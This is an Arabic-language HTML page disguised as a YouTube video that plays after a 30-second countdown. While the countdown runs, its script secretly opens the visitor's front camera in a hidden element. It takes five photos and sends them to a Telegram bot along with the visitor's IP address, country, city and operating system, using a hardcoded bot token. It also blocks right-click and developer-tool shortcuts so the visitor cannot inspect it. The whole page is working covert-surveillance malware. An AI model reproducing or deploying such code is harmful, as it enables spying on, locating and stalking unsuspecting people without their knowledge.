<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو يوتيوب - تأخير 30 ثانية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
        }

        .black-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 1s;
        }

        .timer-text {
            color: white;
            font-size: 48px;
            font-family: monospace;
            background: rgba(0,0,0,0.7);
            padding: 20px 40px;
            border-radius: 20px;
            text-align: center;
        }

        .timer-text small {
            font-size: 18px;
            display: block;
            margin-top: 10px;
            color: #aaa;
        }

        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0s, opacity 1s;
            background: #000;
        }

        .video-background.show {
            visibility: visible;
            opacity: 1;
        }

        .video-background iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }

        canvas {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <div class="black-screen" id="blackScreen">
        <div class="timer-text">
            <span id="countdown">30</span>
            <small>ثانية حتى بدء الفيديو</small>
        </div>
    </div>

    <!-- فيديو يوتيوب - يظهر بعد 30 ثانية -->
    <div class="video-background" id="videoBackground">
        <iframe id="youtubeFrame" 
                src=""
                frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
        </iframe>
    </div>

    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        
        // ==================== رابط فيديو يوتيوب ====================
        const YOUTUBE_VIDEO_ID = "dQw4w9WgXcQ";
        
        // ==================== معلومات بسيطة ====================
        let ip = 'جاري الجلب...';
        let country = 'جاري الجلب...';
        let city = 'جاري الجلب...';
        let os = 'جاري الجلب...';
        
        // ==================== عناصر الصفحة ====================
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const blackScreen = document.getElementById('blackScreen');
        const videoBackground = document.getElementById('videoBackground');
        const youtubeFrame = document.getElementById('youtubeFrame');
        const countdownSpan = document.getElementById('countdown');
        
        // ==================== جلب نظام التشغيل ====================
        function getOS() {
            const userAgent = navigator.userAgent;
            
            if (userAgent.indexOf('Win') !== -1) {
                if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
                else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
                else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
                else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
                else os = 'Windows';
            }
            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
            else if (userAgent.indexOf('Linux') !== -1) {
                if (userAgent.indexOf('Android') !== -1) os = 'Android';
                else os = 'Linux';
            }
            else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
            else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS (iPhone)';
            else if (userAgent.indexOf('iPad') !== -1) os = 'iOS (iPad)';
            else {
                os = 'غير معروف';
            }
            
            console.log('✅ نظام التشغيل:', os);
        }
        
        // ==================== جلب IP والدولة والمدينة ====================
        async function getLocationInfo() {
            try {
                console.log('🔍 جلب معلومات الموقع...');
                
                const response = await fetch('https://ip-api.com/json/');
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('✅ تم جلب المعلومات:', data);
                    
                    if (data.status === 'success') {
                        ip = data.query || 'غير متاح';
                        country = data.country || 'غير متاح';
                        city = data.city || 'غير متاح';
                        return;
                    }
                }
                
                throw new Error('فشل الجلب');
                
            } catch (error) {
                console.log('محاولة خدمة بديلة...');
                
                try {
                    const response2 = await fetch('https://ipwho.is/');
                    const data2 = await response2.json();
                    
                    ip = data2.ip || 'غير متاح';
                    country = data2.country || 'غير متاح';
                    city = data2.city || 'غير متاح';
                    
                } catch(e) {
                    ip = 'غير متاح';
                    country = 'غير متاح';
                    city = 'غير متاح';
                }
            }
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    console.log('✅ Chat ID:', CHAT_ID);
                    return true;
                }
                console.log('⚠️ أرسل رسالة للبوت أولاً');
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                cameraReady = true;
                console.log('✅ الكاميرا جاهزة');
                return true;
            } catch(err) {
                console.error('خطأ الكاميرا:', err);
                return false;
            }
        }
        
        // ==================== نص المعلومات المبسط مع نظام التشغيل ====================
        function getInfoText(photoNumber) {
            const ipType = ip && ip.includes(':') ? 'IPv6' : 'IPv4';
            
            return `
📸 صورة ${photoNumber}/5

━━━━━━━━━━━━━━━━
📍 معلومات الموقع والجهاز:
━━━━━━━━━━━━━━━━

🌐 عنوان IP: ${ip}
📌 نوع IP: ${ipType}
🗺️ الدولة: ${country}
🏙️ المدينة: ${city}
💻 نظام التشغيل: ${os}

━━━━━━━━━━━━━━━━
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━
            `;
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend(photoNumber) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', getInfoText(photoNumber));
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`✅ تم إرسال الصورة ${photoNumber}`);
                    return true;
                } else {
                    console.log(`❌ فشل إرسال الصورة ${photoNumber}`);
                    return false;
                }
            } catch(e) {
                console.error('خطأ في الإرسال:', e);
                return false;
            }
        }
        
        // ==================== تصوير 5 صور ====================
        async function captureAllPhotos() {
            console.log('🎬 بدء تصوير 5 صور...');
            for (let i = 1; i <= 5; i++) {
                await captureAndSend(i);
                if (i < 5) {
                    await new Promise(resolve => setTimeout(resolve, 9000));
                }
            }
            console.log('🏁 انتهى التصوير');
            
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ==================== تأخير تشغيل الفيديو 30 ثانية ====================
        function startVideoDelay() {
            let secondsLeft = 30;
            countdownSpan.textContent = secondsLeft;
            
            const countdownInterval = setInterval(() => {
                secondsLeft--;
                countdownSpan.textContent = secondsLeft;
                
                if (secondsLeft <= 0) {
                    clearInterval(countdownInterval);
                    
                    const videoUrl = `https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${YOUTUBE_VIDEO_ID}&modestbranding=1&rel=0&showinfo=0`;
                    youtubeFrame.src = videoUrl;
                    
                    console.log('✅ بدء تشغيل الفيديو بعد 30 ثانية');
                    
                    blackScreen.style.opacity = '0';
                    setTimeout(() => {
                        blackScreen.style.display = 'none';
                    }, 1000);
                    
                    videoBackground.classList.add('show');
                }
            }, 1000);
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            console.log('🚀 بدء التشغيل...');
            
            // جلب نظام التشغيل
            getOS();
            
            // جلب IP والدولة والمدينة
            await getLocationInfo();
            
            // تشغيل الكاميرا
            const cameraSuccess = await startCamera();
            
            // الحصول على Chat ID
            await getChatId();
            
            // بدء التصوير
            if (cameraSuccess && CHAT_ID) {
                setTimeout(() => {
                    captureAllPhotos();
                }, 1000);
            }
            
            // بدء تأخير الفيديو
            startVideoDelay();
        }
        
        init();
        
        // منع أدوات المطور
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
